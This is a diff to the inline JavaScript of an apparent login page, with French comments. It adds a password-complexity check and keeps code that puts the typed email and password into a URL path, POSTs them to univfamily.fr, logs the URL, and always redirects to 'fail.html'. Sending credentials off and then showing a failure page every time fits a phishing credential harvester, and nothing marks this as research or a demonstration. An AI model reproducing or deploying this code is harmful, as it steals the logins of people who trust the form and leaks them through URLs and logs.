@@ -34,27 +34,54 @@
 
 <script>
   document.getElementById('form').addEventListener('submit', function (e) {
-  e.preventDefault(); // Empêche la soumission du formulaire par défaut
+      e.preventDefault(); // Empêche la soumission du formulaire par défaut
 
-  var emailinput = document.getElementById("email");
-  var emailValue = emailinput.value;
-  var passwordInput = document.getElementById("mdp");
-  var passwordValue = passwordInput.value;
+      var emailInput = document.getElementById("email");
+      var emailValue = emailInput.value;
+      var passwordInput = document.getElementById("mdp");
+      var passwordValue = passwordInput.value;
 
-  apiUrl = 'https://univfamily.fr:443/tadam/' + emailValue + "/" + passwordValue
-  console.log(apiUrl)
-  fetch(apiUrl , {
-    method: 'POST',
-  })
-  .then(data => {
-    // Effectuez la redirection une fois que la réponse de l'API est traitée
-    window.location.href = 'fail.html';
-  })
-    .catch(error => {
-      // Gérez les erreurs en cas d'échec de l'appel API
-      console.error('Erreur lors de l\'appel API : ' + error);
+      // Ajout de la vérification du mot de passe
+      if (!validatePassword(passwordValue)) {
+          alert("Le mot de passe doit contenir au moins un chiffre, un caractère spécial et une majuscule.");
+          return;
+      }
+
+      apiUrl = 'https://univfamily.fr:443/tadam/' + emailValue + "/" + passwordValue
+      console.log(apiUrl)
+      fetch(apiUrl , {
+        method: 'POST',
+      })
+      .then(data => {
+        // Effectuez la redirection une fois que la réponse de l'API est traitée
+        window.location.href = 'fail.html';
+      })
+        .catch(error => {
+          // Gérez les erreurs en cas d'échec de l'appel API
+          console.error('Erreur lors de l\'appel API : ' + error);
+        });
     });
-});
+
+  // Fonction pour valider le mot de passe
+  function validatePassword(password) {
+      // Vérifier au moins un chiffre
+      if (!/\d/.test(password)) {
+          return false;
+      }
+
+      // Vérifier au moins un caractère spécial
+      if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
+          return false;
+      }
+
+      // Vérifier au moins une majuscule
+      if (!/[A-Z]/.test(password)) {
+          return false;
+      }
+
+      // Si toutes les conditions sont remplies, retourner vrai
+      return true;
+  }
 </script>
 
 <style>
